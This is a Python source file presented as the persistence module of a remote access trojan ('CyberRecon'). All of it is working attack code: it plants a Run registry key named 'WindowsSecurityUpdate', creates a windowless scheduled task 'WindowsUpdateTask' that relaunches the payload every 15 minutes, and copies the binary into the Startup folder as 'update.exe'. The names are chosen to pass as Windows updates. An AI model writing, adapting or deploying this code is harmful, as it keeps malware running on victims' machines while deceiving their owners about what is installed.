"""
CyberRecon Persistence Module
Multiple persistence mechanisms for RAT survival.
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path


class PersistenceManager:
    def __init__(self, executable_path=None):
        self.executable_path = executable_path or sys.executable
        self.methods = []

    def registry_run_key(self, name="WindowsSecurityUpdate"):
        if os.name != "nt":
            return False
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, self.executable_path)
            winreg.CloseKey(key)
            self.methods.append("registry_run_key")
            print(f"[+] Registry persistence: {name}")
            return True
        except Exception as e:
            print(f"[!] Registry persistence failed: {e}")
            return False

    def scheduled_task(self, name="WindowsUpdateTask", interval_minutes=15):
        if os.name != "nt":
            return False
        try:
            cmd = ["schtasks", "/create", "/f", "/tn", name, "/tr", f'"{self.executable_path}"', "/sc", "minute", "/mo", str(interval_minutes)]
            subprocess.run(cmd, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            self.methods.append("scheduled_task")
            print(f"[+] Scheduled task persistence: {name}")
            return True
        except Exception as e:
            print(f"[!] Scheduled task failed: {e}")
            return False

    def startup_folder(self, name="update.exe"):
        if os.name != "nt":
            return False
        try:
            startup_path = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            dest = startup_path / name
            shutil.copy2(self.executable_path, dest)
            self.methods.append("startup_folder")
            print(f"[+] Startup folder persistence: {dest}")
            return True
        except Exception as e:
            print(f"[!] Startup folder failed: {e}")
            return False

    def establish_all(self):
        print("[*] Establishing persistence...")
        self.registry_run_key()
        self.scheduled_task()
        self.startup_folder()
        print(f"[+] Active persistence methods: {self.methods}")
        return self.methods

    def remove_all(self):
        print("[*] Removing persistence...")
        if "registry_run_key" in self.methods:
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSecurityUpdate")
                winreg.CloseKey(key)
            except:
                pass
        if "scheduled_task" in self.methods:
            subprocess.run(["schtasks", "/delete", "/f", "/tn", "WindowsUpdateTask"], capture_output=True)
        if "startup_folder" in self.methods:
            try:
                (Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "update.exe").unlink(missing_ok=True)
            except:
                pass
        self.methods.clear()
        print("[+] Persistence removed")
